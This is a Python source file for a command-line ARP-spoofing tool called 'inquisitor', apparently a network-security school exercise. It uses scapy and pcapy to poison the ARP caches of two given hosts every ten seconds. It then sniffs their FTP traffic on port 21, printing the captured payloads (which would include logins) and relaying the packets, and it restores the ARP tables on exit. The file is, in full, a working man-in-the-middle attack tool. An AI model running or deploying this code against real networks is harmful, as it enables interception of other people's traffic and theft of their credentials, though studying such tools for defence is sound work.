import argparse
import os, sys
import signal
import argparse
import pcapy
import scapy.all as scapy
import threading
import socket

from getmac import get_mac_address

def ft_is_forward_activated():
    with open("/proc/sys/net/ipv4/ip_forward", "rt") as file:
        readed = file.read()
        if "1\n" == readed:
            return True
    return False

class Spoofer(threading.Thread):
    class SpooferRefresh(threading.Thread):
        def __init__(self, event, ip_src, mac_src, ip_dst, mac_dst, mac_origin) -> None:
            super(Spoofer.SpooferRefresh, self).__init__()
            self.event = event
            self.ip_src = ip_src
            self.mac_src = mac_src
            self.ip_dst = ip_dst
            self.mac_dst = mac_dst
            hostname = socket.gethostname()
            self.ip_address = socket.gethostbyname(hostname)
            self.mac = mac_origin

        def run(self):
            ''' Spoofing done every X seconds'''
            seconds_to_spoof = 10
            while not self.event.is_set():
                print("ARP spoofing", flush=True) # Spoof
                Spoofer.SpooferRefresh.ft_spoof(self.ip_src, self.ip_dst,  self.mac_dst)
                Spoofer.SpooferRefresh.ft_spoof(self.ip_dst, self.ip_src,  self.mac_src)
                self.event.wait(seconds_to_spoof)

            # Restore
            Spoofer.SpooferRefresh.ft_restore(self.ip_dst, self.mac_dst, self.ip_src,  self.mac_src)
            Spoofer.SpooferRefresh.ft_restore(self.ip_src, self.mac_src, self.ip_dst,  self.mac_dst)

        def ft_spoof(ip_origin, ip_dest, mac_dest):
            scapy.sendp((scapy.Ether(dst=mac_dest) / scapy.ARP(op=1, pdst = ip_dest, hwdst= mac_dest, psrc=ip_origin)), verbose=0)
            scapy.send(scapy.ARP(op = 2,
                                pdst = ip_dest, hwdst = mac_dest, 
                                psrc = ip_origin), verbose = 0)
            
        def ft_restore(ip_origin, mac_origin, ip_dest, mac_dest):
            scapy.sendp((scapy.Ether(dst=mac_dest) / scapy.ARP(op=1, pdst = ip_dest, hwdst= mac_dest, psrc=ip_origin)), verbose=0)
            scapy.send(scapy.ARP(op = 2,
                                pdst = ip_dest, hwdst = mac_dest, 
                                psrc = ip_origin, hwsrc = mac_origin), verbose = 0)

    def __init__(self, ip_src, mac_src, ip_dst, mac_dst) -> None:
        print("Init thread", flush=True)
        super(Spoofer, self).__init__()
        self.event = threading.Event()
        self.mac = get_mac_address()
        self.ip_src = ip_src
        self.mac_src = mac_src
        self.ip_dst = ip_dst
        self.mac_dst = mac_dst
        self.spoofer_refresher = Spoofer.SpooferRefresh(self.event, self.ip_src, self.mac_src, self.ip_dst, self.mac_dst, self.mac)
        self.forwarding = ft_is_forward_activated()
        self.pcap_listener = None
        signal.signal(signal.SIGINT, self.catch)
        signal.signal(signal.SIGTERM, self.catch)
        signal.siginterrupt(signal.SIGINT, True)

    def catch(self, signum, frame):
        print("\r", end="", flush=True)
        print("Free the arp tables", flush=True)
        self.event.set()
        self.spoofer_refresher.join()
        self.pcap_listener.close()
        os._exit(0)

    def run(self):
        self.spoofer_refresher.start()
        self.pcap_listener = pcapy.open_live("eth0", 2000, True, 1000)
        self.pcap_listener.setfilter("port 21")
        while True:
            next_packet = self.pcap_listener.next()
            self.ft_process_packet(scapy.Ether(next_packet[1]))

    def ft_process_packet(self, packet):
        if scapy.Raw in packet:
            if packet[scapy.Ether].src != self.mac:
                info = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                print("Mensaje capturado", flush=True)
                print(info, flush=True)
                if not self.forwarding:
                    packet.src=self.mac
                    if packet[scapy.Ether].src == self.mac_src:
                        packet.dst=self.mac_dst
                    else:
                        packet.dst=self.mac_src
                    scapy.sendp(packet, verbose=0)
            else:
                print("Mensaje reenviado\n", flush=True)

def ft_parser_args():
    parser = argparse.ArgumentParser(description='ARP spoofer, ./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
    parser.add_argument('addresses', action='store', nargs=4, help="<IP-src> <MAC-src> <IP-target> <MAC-target>")

    args = parser.parse_args()
 
    return (args.addresses[0],args.addresses[1] ,args.addresses[2] ,args.addresses[3])

if __name__ == "__main__":
    ip_src, mac_src, ip_dst, mac_dst = ft_parser_args()
    spoofer = Spoofer(ip_src, mac_src, ip_dst, mac_dst)
    spoofer.start()
    spoofer.join()
